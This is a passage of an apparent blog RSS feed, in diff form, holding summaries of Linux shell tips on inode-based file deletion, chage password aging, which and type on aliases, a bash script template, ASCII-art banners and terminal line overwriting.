+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#d19a66"&gt;6517085&lt;/span&gt; -rw-r--r-- &lt;span style="color:#d19a66"&gt;1&lt;/span&gt; ZZ &lt;span style="color:#d19a66"&gt;197121&lt;/span&gt; &lt;span style="color:#d19a66"&gt;4&lt;/span&gt; Nov &lt;span style="color:#d19a66"&gt;6&lt;/span&gt; 06:18 &lt;span style="color:#98c379"&gt;&amp;#39;␴ω␴␴␣␦&amp;#39;$&amp;#39;\342\220\264&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#d19a66"&gt;7826050&lt;/span&gt; -rw-r--r-- &lt;span style="color:#d19a66"&gt;1&lt;/span&gt; ZZ &lt;span style="color:#d19a66"&gt;197121&lt;/span&gt; &lt;span style="color:#d19a66"&gt;3&lt;/span&gt; Nov &lt;span style="color:#d19a66"&gt;9&lt;/span&gt; 04:23 &lt;span style="color:#98c379"&gt;&amp;#39;&amp;#39;$&amp;#39;\356\200\215\356\200\215\356\200\215&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#d19a66"&gt;4685554&lt;/span&gt; -rw-r--r-- &lt;span style="color:#d19a66"&gt;1&lt;/span&gt; ZZ &lt;span style="color:#d19a66"&gt;197121&lt;/span&gt; &lt;span style="color:#d19a66"&gt;4&lt;/span&gt; Nov &lt;span style="color:#d19a66"&gt;6&lt;/span&gt; 06:27
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;we can delete the desired file by passing its inode number to the -inum switch of the find command&lt;/p&gt;</description></item><item><title>/etc/shadow and Creating yescrypt, MD5, SHA-256, and SHA-512 Password Hashes</title><link>https://linzeyan.github.io/posts/2022/20221114-shadow-passwords/</link><pubDate>Mon, 14 Nov 2022 12:55:39 +0800</pubDate><guid>https://linzeyan.github.io/posts/2022/20221114-shadow-passwords/</guid><description>&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://www.baeldung.com/linux/shadow-passwords" target="_blank" rel="noopener"&gt;/etc/shadow and Creating yescrypt, MD5, SHA-256, and SHA-512 Password Hashes&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id="chage-and-password-aging"&gt;chage and Password Aging&lt;/h5&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;chage --list root
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Last password change : Oct 01, &lt;span style="color:#d19a66"&gt;2022&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Password expires : never
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Password inactive : never
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Account expires : never
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Minimum number of days between password change : &lt;span style="color:#d19a66"&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Maximum number of days between password change : &lt;span style="color:#d19a66"&gt;99999&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Number of days of warning before password expires : &lt;span style="color:#d19a66"&gt;7&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Consequently, we can change any field via its associated flag:&lt;/p&gt;</description></item><item><title>How to Use which on an Aliased Command</title><link>https://linzeyan.github.io/posts/2022/20221110-which-on-an-aliased-command/</link><pubDate>Thu, 10 Nov 2022 16:24:30 +0800</pubDate><guid>https://linzeyan.github.io/posts/2022/20221110-which-on-an-aliased-command/</guid><description>&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://www.baeldung.com/linux/which-on-an-aliased-command" target="_blank" rel="noopener"&gt;How to Use which on an Aliased Command&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id="type"&gt;type&lt;/h5&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;type&lt;/span&gt; grep
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;grep is an &lt;span style="color:#e5c07b"&gt;alias&lt;/span&gt; &lt;span style="color:#c678dd"&gt;for&lt;/span&gt; grep --color&lt;span style="color:#56b6c2"&gt;=&lt;/span&gt;auto
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;# Bash&amp;#39;s type&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;type&lt;/span&gt; -P grep
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;/usr/bin/grep
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;# Zsh&amp;#39;s type&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;type&lt;/span&gt; -p grep
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;grep is /usr/bin/grep
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id="gnu-which"&gt;GNU which&lt;/h5&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;which -a which
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;which: shell built-in &lt;span style="color:#e5c07b"&gt;command&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;/usr/bin/which
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;alias&lt;/span&gt; top10
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e06c75"&gt;top10&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;=&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#39;print -l ${(o)history%% *} | uniq -c | sort -nr | head -n 10&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;alias&lt;/span&gt; | /usr/bin/which -i top10
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e06c75"&gt;top10&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;=&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#39;print -l ${(o)history%% *} | uniq -c | sort -nr | head -n 10&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; /usr/bin/uniq
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; /usr/bin/sort
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; /usr/bin/head
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description></item><item><title>Shell Script Best Practices</title><link>https://linzeyan.github.io/posts/2022/20221103-shell-script-best-practices/</link><pubDate>Thu, 03 Nov 2022 16:51:11 +0800</pubDate><guid>https://linzeyan.github.io/posts/2022/20221103-shell-script-best-practices/</guid><description>&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://sharats.me/posts/shell-script-best-practices/" target="_blank" rel="noopener"&gt;Shell Script Best Practices&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id="things"&gt;Things&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;Just make the first line be &lt;code&gt;#!/usr/bin/env bash&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Use the &lt;code&gt;.sh&lt;/code&gt; (or &lt;code&gt;.bash&lt;/code&gt;) extension for your file.&lt;/li&gt;
+&lt;li&gt;Use &lt;code&gt;set -o errexit&lt;/code&gt; at the start of your script.&lt;/li&gt;
+&lt;li&gt;Prefer to use &lt;code&gt;set -o nounset&lt;/code&gt;.
+&lt;ol&gt;
+&lt;li&gt;use &lt;code&gt;&amp;quot;${VARNAME-}&amp;quot;&lt;/code&gt; instead of &lt;code&gt;&amp;quot;$VARNAME&amp;quot;&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;Use &lt;code&gt;set -o pipefail&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Use &lt;code&gt;set -o xtrace&lt;/code&gt;, with a check on &lt;code&gt;$TRACE&lt;/code&gt; env variable.
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;if [[ &amp;quot;${TRACE-0}&amp;quot; == &amp;quot;1&amp;quot; ]]; then set -o xtrace; fi&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;People can now enable debug mode, by running your script as &lt;code&gt;TRACE=1 ./script.sh&lt;/code&gt; instead of &lt;code&gt;./script.sh&lt;/code&gt;.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;Use &lt;code&gt;[[ ]]&lt;/code&gt; for conditions in &lt;code&gt;if&lt;/code&gt; / &lt;code&gt;while&lt;/code&gt; statements, instead of &lt;code&gt;[ ]&lt;/code&gt; or &lt;code&gt;test&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Always quote variable accesses with double-quotes.&lt;/li&gt;
+&lt;li&gt;Use &lt;code&gt;local&lt;/code&gt; variables in functions.&lt;/li&gt;
+&lt;li&gt;When printing error messages, please redirect to stderr.
+&lt;ol&gt;
+&lt;li&gt;Use &lt;code&gt;echo 'Something unexpected happened' &amp;gt;&amp;amp;2&lt;/code&gt; for this.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;Use long options, where possible (like &lt;code&gt;--silent&lt;/code&gt; instead of &lt;code&gt;-s&lt;/code&gt;).&lt;/li&gt;
+&lt;li&gt;If appropriate, change to the script&amp;rsquo;s directory close to the start of the script.
+&lt;ol&gt;
+&lt;li&gt;Use cd &amp;ldquo;$(dirname &amp;ldquo;$0&amp;rdquo;)&amp;rdquo;, which works in most cases.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;Use &lt;code&gt;shellcheck&lt;/code&gt;. Heed its warnings.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id="template"&gt;Template&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;#!/usr/bin/env bash
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;set&lt;/span&gt; -o errexit
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;set&lt;/span&gt; -o nounset
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;set&lt;/span&gt; -o pipefail
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#c678dd"&gt;if&lt;/span&gt; &lt;span style="color:#56b6c2"&gt;[[&lt;/span&gt; &lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#98c379"&gt;${&lt;/span&gt;&lt;span style="color:#e06c75"&gt;TRACE&lt;/span&gt;-0&lt;span style="color:#98c379"&gt;}&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt; &lt;span style="color:#56b6c2"&gt;==&lt;/span&gt; &lt;span style="color:#98c379"&gt;&amp;#34;1&amp;#34;&lt;/span&gt; &lt;span style="color:#56b6c2"&gt;]]&lt;/span&gt;; &lt;span style="color:#c678dd"&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e5c07b"&gt;set&lt;/span&gt; -o xtrace
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#c678dd"&gt;fi&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#c678dd"&gt;if&lt;/span&gt; &lt;span style="color:#56b6c2"&gt;[[&lt;/span&gt; &lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#98c379"&gt;${&lt;/span&gt;&lt;span style="color:#e06c75"&gt;1&lt;/span&gt;-&lt;span style="color:#98c379"&gt;}&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt; &lt;span style="color:#56b6c2"&gt;=&lt;/span&gt;~ ^-*h&lt;span style="color:#56b6c2"&gt;(&lt;/span&gt;elp&lt;span style="color:#56b6c2"&gt;)&lt;/span&gt;?$ &lt;span style="color:#56b6c2"&gt;]]&lt;/span&gt;; &lt;span style="color:#c678dd"&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e5c07b"&gt;echo&lt;/span&gt; &lt;span style="color:#98c379"&gt;&amp;#39;Usage: ./script.sh arg-one arg-two
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#98c379"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#98c379"&gt;This is an awesome bash script to make your life better.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#98c379"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#98c379"&gt;&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e5c07b"&gt;exit&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#c678dd"&gt;fi&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;cd&lt;/span&gt; &lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#c678dd"&gt;$(&lt;/span&gt;dirname &lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#e06c75"&gt;$0&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#c678dd"&gt;)&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;main&lt;span style="color:#56b6c2"&gt;()&lt;/span&gt; &lt;span style="color:#56b6c2"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e5c07b"&gt;echo&lt;/span&gt; &lt;span style="color:#c678dd"&gt;do&lt;/span&gt; awesome stuff
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#56b6c2"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;main &lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#e06c75"&gt;$@&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description></item><item><title>The Art of Command Line</title><link>https://linzeyan.github.io/posts/2022/20221102-the-art-of-command-line/</link><pubDate>Wed, 02 Nov 2022 15:04:37 +0800</pubDate><guid>https://linzeyan.github.io/posts/2022/20221102-the-art-of-command-line/</guid><description>&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://github.com/jlevy/the-art-of-command-line" target="_blank" rel="noopener"&gt;The Art of Command Line&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</description></item><item><title>Printing ASCII Art in the Shell</title><link>https://linzeyan.github.io/posts/2022/20221021-shell-printing-ascii-art/</link><pubDate>Fri, 21 Oct 2022 17:30:41 +0800</pubDate><guid>https://linzeyan.github.io/posts/2022/20221021-shell-printing-ascii-art/</guid><description>&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://www.baeldung.com/linux/shell-printing-ascii-art" target="_blank" rel="noopener"&gt;Printing ASCII Art in the Shell&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id="banner"&gt;banner&lt;/h5&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;sudo apt install sysvbanner&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$ banner hello
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#7f848e"&gt;# # ###### # # ####&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#7f848e"&gt;# # # # # # #&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#7f848e"&gt;###### ##### # # # #&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#7f848e"&gt;# # # # # # #&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#7f848e"&gt;# # # # # # #&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#7f848e"&gt;# # ###### ###### ###### ####&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id="figlet-frank-ian-and-glenns-letters"&gt;FIGlet: Frank, Ian, and Glenn&amp;rsquo;s Letters&lt;/h5&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;sudo apt install figlet&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$ figlet hello
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; _ _ _
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;| |__ ___| | | ___
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;| &amp;#39;_ &lt;span style="color:#98c379"&gt;\ &lt;/span&gt;/ _ &lt;span style="color:#98c379"&gt;\ &lt;/span&gt;| |/ _ &lt;span style="color:#98c379"&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;| | | | __/ | | &lt;span style="color:#56b6c2"&gt;(&lt;/span&gt;_&lt;span style="color:#56b6c2"&gt;)&lt;/span&gt; |
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;|_| |_|&lt;span style="color:#98c379"&gt;\_&lt;/span&gt;__|_|_|&lt;span style="color:#98c379"&gt;\_&lt;/span&gt;__/
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;-f&lt;/code&gt; option and specify a font name for the output&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-l&lt;/code&gt;, &lt;code&gt;-c&lt;/code&gt;, and &lt;code&gt;-r&lt;/code&gt; options to align the text to the left, center, or right,&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id="toilet-figlet-with-more-options"&gt;TOIlet: FIGlet With More Options&lt;/h5&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;sudo apt install toilet&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;</description></item><item><title>How to Make Output Overwrite the Same Line in a Terminal</title><link>https://linzeyan.github.io/posts/2022/20221021-echo-printf-overwrite-terminal-line/</link><pubDate>Fri, 21 Oct 2022 17:29:10 +0800</pubDate><guid>https://linzeyan.github.io/posts/2022/20221021-echo-printf-overwrite-terminal-line/</guid><description>&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://www.baeldung.com/linux/echo-printf-overwrite-terminal-line" target="_blank" rel="noopener"&gt;How to Make Output Overwrite the Same Line in a Terminal&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id="introduction-to-the-problem"&gt;Introduction to the Problem&lt;/h5&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$ cat print_status.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;!/bin/bash
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;echo&lt;/span&gt; &lt;span style="color:#98c379"&gt;&amp;#34;[INFO] Processing file: readme.txt&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sleep &lt;span style="color:#d19a66"&gt;2&lt;/span&gt; To simulate the file processing
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;echo&lt;/span&gt; &lt;span style="color:#98c379"&gt;&amp;#34;[INFO] Processing file: veryPowerfulService.service&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sleep &lt;span style="color:#d19a66"&gt;2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;echo&lt;/span&gt; &lt;span style="color:#98c379"&gt;&amp;#34;[INFO] Processing file: log.txt&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;echo&lt;/span&gt; &lt;span style="color:#98c379"&gt;&amp;#34;DONE&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$ ./print_status.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#56b6c2"&gt;[&lt;/span&gt;INFO&lt;span style="color:#56b6c2"&gt;]&lt;/span&gt; Processing file: readme.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#56b6c2"&gt;[&lt;/span&gt;INFO&lt;span style="color:#56b6c2"&gt;]&lt;/span&gt; Processing file: veryPowerfulService.service
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#56b6c2"&gt;[&lt;/span&gt;INFO&lt;span style="color:#56b6c2"&gt;]&lt;/span&gt; Processing file: log.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;DONE
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id="the-magic-code-0330kr"&gt;The &amp;ldquo;Magic Code&amp;rdquo;: &lt;code&gt;\033[0K\r&lt;/code&gt;&lt;/h5&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;-n&lt;/code&gt; option asks the echo command to stop outputting the trailing newline character&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-e&lt;/code&gt; option allows the echo command to interpret backslash escapes such as &lt;code&gt;\n&lt;/code&gt; (newline) and &lt;code&gt;\r&lt;/code&gt; (carriage return)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;\033&lt;/code&gt; - It&amp;rsquo;s the escape sequence. In other words, it&amp;rsquo;s ESC.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;\033[&lt;/code&gt; - Then this becomes &amp;ldquo;ESC [&amp;rdquo;, which is the control sequence introducer (CSI).&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;\033[0k&lt;/code&gt; - So it&amp;rsquo;s &amp;ldquo;CSI 0 K&amp;rdquo;. Further, &amp;ldquo;CSI 0 K&amp;rdquo; erases the text from the cursor to the end of the line.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;\r&lt;/code&gt; - This is the carriage return. It brings the cursor to the beginning of the line.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$ cat print_status.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;#!/bin/bash&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;echo&lt;/span&gt; -ne &lt;span style="color:#98c379"&gt;&amp;#34;[INFO] Processing file: readme.txt\033[0K\r&amp;#34;&lt;/span&gt;
